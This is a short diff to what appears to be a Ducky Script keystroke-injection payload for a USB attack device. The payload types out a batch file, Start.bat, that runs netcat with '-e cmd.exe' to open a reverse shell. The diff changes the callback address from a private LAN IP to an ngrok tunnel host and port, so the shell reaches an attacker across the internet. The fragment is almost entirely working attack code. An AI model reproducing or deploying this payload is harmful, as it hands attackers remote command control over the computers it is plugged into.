@@ -34,7 +34,7 @@ DELAY 500
 REM --> Creates a batch file to start listening 
 STRING copy con Start.bat
 ENTER
-STRING nc 10.10.30.45 1234 -e cmd.exe
+STRING nc 0.tcp.ap.ngrok.io 10920 -e cmd.exe
 ENTER
 CONTROL z
 ENTER
